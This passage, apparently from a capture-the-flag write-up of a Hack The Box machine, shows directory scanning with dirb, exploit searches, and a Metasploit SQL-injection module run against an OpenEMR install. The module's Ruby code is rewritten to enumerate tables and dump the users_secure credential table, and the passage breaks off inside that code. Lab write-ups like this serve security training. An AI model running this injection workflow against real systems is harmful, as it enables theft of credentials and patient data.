&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Username didn&amp;#39;t Match&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nx"&gt;error_username&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#loginform&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;submit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;event&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="cm"&gt;/* Act on the event */&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nx"&gt;error_correctPassword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nx"&gt;checkCorrectPassword&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nx"&gt;error_username&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nx"&gt;checkCorrectUsername&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error_correctPassword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;error_username&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;});&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; the page is also directly accessible without authentication. Some JavaScript on the body tag will make you go back to the login page if you don't have the right &lt;code&gt;referer&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The page is just under construction and there is not a much to do.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Page under construction" src="/media/2020.10/cache_03.png"&gt;&lt;/p&gt;
&lt;p&gt;We read the author's page again and focus on its other project: HMS.&lt;/p&gt;
&lt;p&gt;We modify our /etc/hosts to add the hms.htb domain (still on the same IP address).
We can then browser to the page and get a authentication form for
&lt;a href="https://www.open-emr.org/"&gt;openEMR&lt;/a&gt;.
The previously find credentials are not working..&lt;/p&gt;
&lt;p&gt;&lt;img alt="Page under construction" src="/media/2020.10/cache_04.png"&gt;&lt;/p&gt;
&lt;p&gt;We run a &lt;code&gt;dirb&lt;/code&gt; against this new domain and found a &lt;code&gt;admin.php&lt;/code&gt; file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dirb http://hms.htb&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;START_TIME: Sat May 16 04:43:49 2020&lt;/span&gt;
&lt;span class="code-line"&gt;URL_BASE: http://hms.htb/&lt;/span&gt;
&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Scanning URL: http://hms.htb/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://hms.htb/admin.php (CODE:200|SIZE:937)&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://hms.htb/common/&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://hms.htb/config/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We cannot do much with this admin page but it disclose us the exact version of
openEMR used.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Page under construction" src="/media/2020.10/cache_05.png"&gt;&lt;/p&gt;
&lt;p&gt;We use &lt;code&gt;searchsploit&lt;/code&gt; in order to find an exploit for our version but all of
them are authenticated.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/$ searchsploit openemr  5.0.1 &lt;/span&gt;
&lt;span class="code-line"&gt;------------------------------------------------------------ ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit Title                                              |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;------------------------------------------------------------ ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions    | linux/webapps/45202.txt&lt;/span&gt;
&lt;span class="code-line"&gt;OpenEMR &amp;lt; 5.0.1 - (Authenticated) Remote Code Execution     | php/webapps/45161.py&lt;/span&gt;
&lt;span class="code-line"&gt;OpenEMR &amp;lt; 5.0.1 - (Authenticated) Remote Code Execution     | php/webapps/45161.py&lt;/span&gt;
&lt;span class="code-line"&gt;------------------------------------------------------------ ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Shellcodes: No Results&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We launch metasploit and search of openEMR exploit. We found a SQL injection
dump exploit.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 &amp;gt; search openemr&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Modules&lt;/span&gt;
&lt;span class="code-line"&gt;================&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  #  Name                                             Disclosure Date  Rank       Check  Description&lt;/span&gt;
&lt;span class="code-line"&gt;  -  ----                                             ---------------  ----       -----  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;  0  auxiliary/sqli/openemr/openemr_sqli_dump         2019-05-17       normal     Yes    OpenEMR 5.0.1 Patch 6 SQLi Dump&lt;/span&gt;
&lt;span class="code-line"&gt;  1  exploit/unix/webapp/openemr_sqli_privesc_upload  2013-09-16       excellent  Yes    OpenEMR 4.1.1 Patch 14 SQLi Privilege Escalation Remote Code Execution&lt;/span&gt;
&lt;span class="code-line"&gt;  2  exploit/unix/webapp/openemr_upload_exec          2013-02-13       excellent  Yes    OpenEMR PHP File Upload Vulnerability&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We configure the different option, especially the &lt;code&gt;vhost&lt;/code&gt; and run the exploit.
We quickly get some result and it start to dump the first table out of 295… 295!
This will take forever.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &amp;gt; show options&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Module options (auxiliary/sqli/openemr/openemr_sqli_dump):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Name       Current Setting  Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;  ----       ---------------  --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]&lt;/span&gt;
&lt;span class="code-line"&gt;  RHOSTS     10.10.10.188     yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;  RPORT      80               yes       The target port (TCP)&lt;/span&gt;
&lt;span class="code-line"&gt;  SSL        false            no        Negotiate SSL/TLS for outgoing connections&lt;/span&gt;
&lt;span class="code-line"&gt;  TARGETURI  /                yes       The base path to the OpenEMR installation&lt;/span&gt;
&lt;span class="code-line"&gt;  VHOST      hms.htb          no        HTTP server virtual host&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &amp;gt; run&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Running module against 10.10.10.188&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] DB Version: 5.7.30-0ubuntu0.18.04.1&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Enumerating tables, this may take a moment...&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Identified 295 tables.&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (1/295): CHARACTER_SETS&lt;/span&gt;
&lt;span class="code-line"&gt;^C[-] Stopping running against current target...&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Control-C again to force quit all targets.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We grab the exploit code on &lt;a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/sqli/openemr/openemr_sqli_dump.rb"&gt;rapid7 github&lt;/a&gt;
and rewrite the &lt;code&gt;dump_all&lt;/code&gt; module in order to just list the different tables (we
just comment the lines dumping and saving the tables).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;dump_all&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;version()&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;db_version&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;exec_payload_and_parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;print_status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DB Version: &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;db_version&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;print_status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Enumerating tables, this may take a moment...&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;tables&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;enumerate_tables&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;num_tables&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tables&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;print_status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Identified &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;num_tables&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; tables.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="c1"&gt;# These tables are impossible to fetch because they increase each request&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;skiptables&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sx"&gt;%w[form_taskman log log_comment_encrypt]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;tables&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;each_with_index&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;skiptables&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;include?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;print_status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Skipping table (&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;num_tables&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;): &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="k"&gt;else&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;print_status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Dumping table (&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;num_tables&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;): &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="c1"&gt;#table_data = walk_table(table)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="c1"&gt;#save_csv(table_data, table)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;print_status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Dumped all tables to &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="no"&gt;Msf&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loot_directory&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We load our
&lt;a href="https://github.com/rapid7/metasploit-framework/wiki/Running-Private-Modules"&gt;private msf module&lt;/a&gt;
configure it and run it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 auxiliary(test/openemr_sqli_dump) &amp;gt; run&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Running module against 10.10.10.188&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] DB Version: 5.7.30-0ubuntu0.18.04.1&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Enumerating tables, this may take a moment...&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Identified 295 tables.&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (1/295): CHARACTER_SETS&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;snip&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (284/295): therapy_groups_counselors&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (285/295): therapy_groups_participant_attendance&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (286/295): therapy_groups_participants&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (287/295): transactions&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (288/295): user_settings&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (289/295): users&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (290/295): users_facility&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (291/295): users_secure&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (292/295): valueset&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (293/295): version&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (294/295): voids&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Dumping table (295/295): x12_partners&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We quickly look at the table structure on the &lt;a href="https://www.open-emr.org/wiki/index.php/Database_Structure"&gt;openEMR wiki&lt;/a&gt;
and dump the table &lt;code&gt;users&lt;/code&gt; with the index 288 (yes the table index start at 0).&lt;/p&gt;
&lt;p&gt;It contains nothing interesting as the users' password where moved into the
&lt;code&gt;users_secure&lt;/code&gt; table (an attentive reading of the wiki page will had give us
that immediately).&lt;/p&gt;
&lt;p&gt;We re-wrote our personal module in order to dump the table &lt;code&gt;users_secure&lt;/code&gt; with
the index 290. The &lt;code&gt;dump_all&lt;/code&gt; function now looks like the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;dump_all&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;version()&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;db_version&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;exec_payload_and_parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;print_status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DB Version: &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;db_version&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="n"&gt;print_status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;version 2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;print_status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Enumerating tables, this may take a moment...&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;tables&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;enumerate_tables&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;num_tables&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tables&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;print_status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Identified &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;num_tables&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; tables.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="c1"&gt;# These tables are impossible to fetch because they increase each request&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;skiptables&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sx"&gt;%w[form_taskman log log_comment_encrypt]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;tables&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;each_with_index&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;skiptables&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;include?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
